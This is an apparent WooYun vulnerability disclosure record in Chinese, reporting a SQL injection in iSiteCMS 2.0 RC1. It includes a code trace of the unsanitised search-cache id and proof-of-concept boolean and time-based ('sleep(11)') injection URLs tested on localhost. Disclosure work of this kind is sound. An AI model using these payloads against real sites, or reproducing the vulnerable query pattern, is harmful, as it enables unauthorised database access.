{"id": 58156, "wybug_id": "wooyun-2014-052143", "wybug_title": "iSiteCMS最新版本sql注射漏洞", "wybug_corp": "kometo.com", "wybug_author": "寂寞的瘦子", "wybug_date": "2014-02-27 13:33", "wybug_open_date": "2014-05-28 13:34", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-03：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-28：\t细节向公众公开  简要描述： 无视GPC~~ 详细说明：  在/iSite 2.0 RC1 B684/isite/core/search.cache.php第114行有这么一个函数\nfunction loadByID($id){\t\t$this->updateCache();//更新缓存，保证获取到的数据时最新的\t\t$this->tag = md5($this->caller.$filterTag);\t\tif($row = $this->DBE->getRow(\"SELECT * FROM #__search_cache WHERE `id`=$id\")){//漏洞在这里\t\t\t$this->_restore($row);\t\t\treturn true;\t\t}else{\t\t\treturn false;\t\t}\n我们尝试跟踪上面的$id来自哪里~~/iSite 2.0 RC1 B684/isite/components/search/search.fe.php第16行\nfunction _ACT_search($id=null){\t\t$this->setWorkChannel(1);\t\tcAuth(AUTH_G_AUSEARCH) or authMsg();******************************************************//省略N代码if(!$sc->loadByFilterTag($where)){\t\t\t\t$ids = $this->DBE->getAll(\"select `id` from #__content WHERE $where limit 1000\");\t\t\t\t$sc->create($where,$ids,$keywords,$intro);\n上面的$sc->loadBYFilter句柄会接受传入的tag值（根据传入的keyword值生成），如果不同，那么执行下面的$this->DBE->getAll(\"select `id` from #__content WHERE $where limit 1000\");显示表中1000条数据的id值给$ids数组。跟进$sc->create\nfunction create($filterTag,$ids,$keywords='',$intro='',$user_id=0,$total=null){\t\tif(is_string($ids)){\t\t\t$ids = explode(',',$ids);**********************************//省略若干\t\t$this->tag = md5($this->caller.$filterTag);\t\t$this->ids = $ids;\t\t$this->intro = $intro;\t\t$this->keywords = $keywords;\t\t$this->user_id = $user_id;\t\t$this->total = $total;\t\t$this->ip = ISS_CLIENT_IP;\t\t$this->id = null;\t\t$this->_save();\n跟进_save()函数\nfunction _save(){\t\tif(is_null($this->id)){\t\t\tif(is_null($this->time)){\t\t\t\t$this->setPeriod();\t\t\t}\t\t\t\t\t\t$rec['tag'] \t= $this->tag;\t\t\t$rec['ids'] \t\t= $this->ids;\t\t\t$rec['intro'] \t= $this->intro;\t\t\t$rec['keywords'] \t= $this->keywords;\t\t\t$rec['user_id'] \t= $this->user_id;\t\t\t$rec['total'] \t= $this->total;\t\t\t$rec['time'] \t= $this->time;\t\t\t$rec['params']\t=  serialize($this->params);\t\t\t\t\t\t$this->DBE->insertRow('#__search_cache',$rec);\t\t\t$this->id = $this->DBE->getInsertID();//这个总算返回了id值，取最后插入缓存表中的id值\n跟进回去/iSite 2.0 RC1 B684/isite/components/search/search.fe.php第70行\n$this->flash('搜索完成','请稍候....',bu(1,'search','search',$sc->id));//这边就是刚才插入的最后的id值，返回到url中\t\t}\t\tif($id){//从url中获取id值\t\t\tif(!$sc->loadByID($id)){//这个函数就是刚开始的第一段代码\t\t\t\t$this->flash('错误','搜索缓存失效'.$id,bu(1,'search','search'));\t\t\t}\n这个函数的作用是获取url传入的id值然后去查找缓存表，如果缓存存在，就从缓存中读取。如果缓存id不纯正就提示缓存失效，这里的url的id可控，所以注入产生。   漏洞证明：  本地搭建环境测试，先要在http://127.0.0.1/site/index.php?igo=iss,search的搜索框中填入几个关键字搜索增加缓存表的缓存记录。然后会返回缓存的url比如http://127.0.0.1/site/index.php?igo=iss,search,search,615我们来看mysql的log是否真的会带入查询\n\n这里由于你们的debug是不回显错误的mysql_error被你们去掉了,蛋碎了最喜欢这个了根据返回对错判断http://127.0.0.1/site/index.php?igo=iss,search,search,615 and 1=1//真http://127.0.0.1/site/index.php?igo=iss,search,search,615 and 1=2//假根据延时判断注射http://127.0.0.1/site/index.php?igo=iss,search,search,615 and sleep(11)//读取数据延时11秒~~\n\n   修复方案：     版权声明：转载请注明来源 寂寞的瘦子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2014-02-28 12:18 厂商回复： 感谢提交的漏洞信息，我们将尽快安排修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-27 14:12 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @xsser 挖的很辛苦啊，前面提交的都是大厂商啊，让我见一次光吧，你看看我贴了多少代码，不过漏掉了一段，我留言了你们也没补上~~    \n     2014-02-28 12:18 |    \t\t慧星网络科技(乌云厂商)\t\t \n  感谢提交的漏洞信息，我们将尽快安排修复！    \n     2014-02-28 12:25 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @慧星网络科技 纳尼，别走还有~~    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}